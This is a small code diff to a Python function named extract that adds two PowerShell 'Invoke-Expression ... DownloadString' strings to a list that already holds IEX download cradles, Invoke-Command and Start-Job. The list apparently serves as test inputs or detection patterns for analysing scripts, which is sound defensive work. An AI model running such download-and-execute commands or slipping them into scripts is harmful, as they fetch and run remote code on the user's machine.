@@ -46,6 +46,8 @@ def extract(dialect, script):
         "IEX(New-Object).DownloadString",
         "IEX(New-Object Net.WebClient).DownloadString('http://x')",
         "iex(New-Object).DownloadString",
+        "Invoke-Expression(New-Object).DownloadString",
+        "Invoke-Expression(New-Object Net.WebClient).DownloadString('http://x')",
         "Invoke-Command -ScriptBlock $sb",
         "Start-Job -ScriptBlock $sb",
     ],
